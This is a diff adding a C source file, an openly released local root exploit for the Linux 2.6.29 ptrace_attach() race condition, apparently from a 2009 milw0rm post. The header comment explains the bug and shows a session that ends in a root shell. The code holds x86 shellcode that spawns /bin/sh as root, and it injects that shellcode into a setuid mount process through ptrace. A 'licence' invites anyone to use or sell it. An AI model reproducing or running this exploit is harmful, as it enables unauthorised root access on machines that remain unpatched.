@@ -1,0 +1,101 @@
+/*
+* GNU/Linux kernel 2.6.29 ptrace_attach() local root race condition exploit.
+* ==========================================================================
+* This is a local root exploit for the 2.6.29 ptrace_attach() race condition that allows
+* a process to gain elevated privileges under certain conditions. The vulnerability is
+* caused due to "ptrace_attach()" using an inadequate mutex while synchronizing with
+* "execve()". This can be exploited to potentially execute arbitrary code with root
+* privileges by attaching to a setuid process. The race is particularly narrow, this
+* exploit checks that it has attached to the correct process before attempting to
+* inject shellcode which helps reduce false positives and shells being spawned with
+* lower privileges.
+*
+* Ex.
+*   matthew@matthew-desktop:~$ id
+*   uid=1000(matthew) gid=1000(matthew)   groups=4(adm),20(dialout),24(cdrom),25(floppy),
+*   29(audio),30(dip),44(video),46(plugdev),107(fuse),109(lpadmin),115(admin),1000(matthew)
+*   matthew@matthew-desktop:~$ uname -a
+*   Linux matthew-desktop 2.6.29-020629-generic #020629 SMP Tue Mar 24 12:03:21 UTC 2009 i686 GNU/Linux
+*   matthew@matthew-desktop:~$ while `/bin/true/`;do ./shoryuken;done
+*   [... much scroll removed, go make coffee, get a job, do something while running ...]
+*   /dev/sda1 on / type ext3 (rw,relatime,errors=remount-ro)
+*   proc on /proc type proc (rw,noexec,nosuid,nodev)
+*   /sys on /sys type sysfs (rw,noexec,nosuid,nodev)
+*   varrun on /var/run type tmpfs (rw,noexec,nosuid,nodev,mode=0755)
+*   varlock on /var/lock type tmpfs (rw,noexec,nosuid,nodev,mode=1777)
+*   udev on /dev type tmpfs (rw,mode=0755)
+*   devshm on /dev/shm type tmpfs (rw)
+*   devpts on /dev/pts type devpts (rw,gid=5,mode=620)
+*   securityfs on /sys/kernel/security type securityfs (rw)
+*   gvfs-fuse-daemon on /home/matthew/.gvfs type fuse.gvfs-fuse-daemon (rw,nosuid,nodev,user=matthew)
+*   [ WIN! 18281
+*   [ Overwritten 0xb8097430
+*   # id
+*   uid=0(root) gid=1000(matthew) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),
+*   44(video),46(plugdev),107(fuse),109(lpadmin),115(admin),1000(matthew)
+*   #
+*
+*  Please note this exploit is released to you under fuqHAK5 licence agreement, you may use
+*  this exploit, sell it, recode it, rip the header and claim it as your own on the condition
+*  that you are not a fan of the hak5 tv "hacking" show. This exploit must not be renamed from
+*  shoryuken.c at any time.
+*
+*   -- prdelka
+*/
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <linux/user.h>
+#include <stdio.h>
+#include <fcntl.h>
+
+char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+                 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+                 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+                 "\x90"
+                 "\x6a\x23\x58\x31"
+                 "\xdb\xcd\x80"
+                 "\x31\xdb\x8d\x43\x17\xcd\x80\x31\xc0"
+                 "\x50\x68""//sh""\x68""/bin""\x89\xe3\x50"
+                 "\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+int main(){
+    pid_t child;
+    int eip, i = 0;
+    struct user_regs_struct regs;
+    char *argv[] = {"mount",0};
+    char *envp[] = {"",0};
+    child = fork();
+    if(child == 0) {
+        execve("/bin/mount",argv,envp);
+    }
+    else {
+        if(ptrace(PTRACE_ATTACH, child, NULL, NULL) == 0) {
+                char buf[256];
+                sprintf(buf, "/proc/%d/cmdline", child);
+                int fd = open(buf, O_RDONLY);
+                read(fd, buf, 2);
+                close(fd);
+                if(buf[0] == 'm') {
+                        printf("[ WIN! %d\n", child);
+                        fflush(stdout);
+                        ptrace(PTRACE_GETREGS, child, NULL, &regs);
+                        eip = regs.eip;
+                        while (i < strlen(shellcode)){
+                                ptrace(PTRACE_POKETEXT, child, eip, (int) *(int *) (shellcode + i));
+                                i += 4;
+                                eip += 4;
+                        }
+                        printf("[ Overwritten 0x%x\n",regs.eip);
+                        ptrace(PTRACE_SETREGS, child, NULL, &regs);
+                        ptrace(PTRACE_DETACH, child, NULL,NULL);
+                        usleep(1);
+                        wait(0);
+                }
+            }
+    }
+    return 0;
+}
+
+// milw0rm.com [2009-05-14]
